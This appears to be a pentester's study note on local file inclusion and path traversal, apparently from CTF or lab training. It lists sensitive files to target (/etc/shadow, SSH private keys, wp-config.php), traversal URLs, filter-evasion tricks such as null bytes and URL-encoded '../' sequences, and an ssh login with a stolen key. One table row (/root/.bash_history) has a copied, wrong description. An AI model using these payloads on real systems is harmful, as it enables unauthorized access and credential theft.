#execusion #webapp 

[[Lessons Learned]]

#### WordPress Config file 

```bash
wp-config.php
```

#### SSH Private Keys

1. First check the **/etc/passwd** 

```bash
/home/user/.ssh/id_rsa
```

```bash
chmod 600 id_rsa
```

```bash
ssh -i id_rsa daniela@192.168.50.244
```

#### Example 


http://webapp.thm/get.php?file=../../../../boot.ini


| Location|Description| 
|------------ | ------------| 
|/etc/issue | contains a message or system identification to be printed before the login prompt.| 
|/etc/profile | controls system-wide default variables, such as Export variables, File creation mask (umask), Terminal types, Mail messages to indicate when new mail has arrived|
|/proc/version | specifies the version of the Linux kernel| 
|/etc/passwd | has all registered user that has access to a system| 
|/etc/shadow |contains information about the system's users' passwords| 
|/root/.bash_history | contains a message or system identification to be printed before the login prompt.| 
|/var/log/dmessage| contains global system messages, including the messages that are logged during system startup| 
|/var/mail/root| all emails for root user| 
|/root/.ssh/id_rsa | Private SSH keys for a root or any known valid user on the server| 
|/var/log/apache2/access.log |the accessed requests for Apache  webserver| 
|C:\\boot.ini |contains the boot options for computers with BIOS firmware| 


#### Filter Evasion 

- %00, 0x00 , ./
- If the directory is restricted use that-directory/../../../../etc/passwd
- Add ? to make the rest as a seperate query
- URL encode 
```bash
curl http://192.168.243.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
```


